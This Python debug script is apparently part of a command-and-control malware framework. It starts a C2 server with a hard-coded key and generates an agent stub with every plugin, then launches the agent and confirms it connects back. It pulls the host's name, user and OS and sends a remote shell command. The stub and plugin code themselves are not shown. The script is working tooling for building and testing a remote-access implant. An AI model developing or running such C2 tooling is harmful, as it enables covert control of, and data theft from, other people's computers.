"""Debug script: start server, generate stub, run agent, test connection."""
import sys, os, time, threading, socket, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from server import C2Engine
from stub_generator import generate_stub
from plugins import PLUGIN_REGISTRY

engine = C2Engine(password="whisper_secret_key", port=4443)
engine.set_callback("status", lambda m: print(f"  Status: {m}"))
srv = threading.Thread(target=engine.start, daemon=True)
srv.start()
time.sleep(0.5)
print(f"Server running: {engine.running}")

stub = generate_stub(sorted(PLUGIN_REGISTRY.keys()), "127.0.0.1", 4443, "whisper_secret_key", 1)
stub_path = os.path.join(os.path.dirname(__file__), "build", "_debug_stub.py")
os.makedirs(os.path.dirname(stub_path), exist_ok=True)
with open(stub_path, "w") as f:
    f.write(stub)

print(f"Stub size: {len(stub):,} bytes")
print("Launching agent...")

proc = subprocess.Popen(
    [sys.executable, stub_path],
    stdout=subprocess.PIPE, stderr=subprocess.PIPE
)
time.sleep(4)

alive = proc.poll() is None
print(f"Agent alive: {alive}")

if engine.clients:
    cid = list(engine.clients.keys())[0]
    print(f"Client connected: {cid}")
    info = engine.clients[cid]["info"]
    hostname = info.get("hostname", "?")
    user = info.get("user", "?")
    os_info = info.get("os", "?")
    print(f"  Hostname: {hostname}")
    print(f"  User: {user}")
    print(f"  OS: {os_info}")

    resp = engine.interact(cid, {"type": "info"})
    print(f"Info response: {resp}")

    resp = engine.interact(cid, {"type": "shell", "cmd": "echo HELLO_FROM_AGENT"})
    print(f"Shell response: {resp}")
else:
    print("No client connected")

if not alive:
    out, err = proc.communicate(timeout=3)
    if out:
        print(f"STDOUT: {out.decode(errors='ignore')[:500]}")
    if err:
        print(f"STDERR: {err.decode(errors='ignore')[:500]}")

proc.kill()
engine.stop()
print("Done")
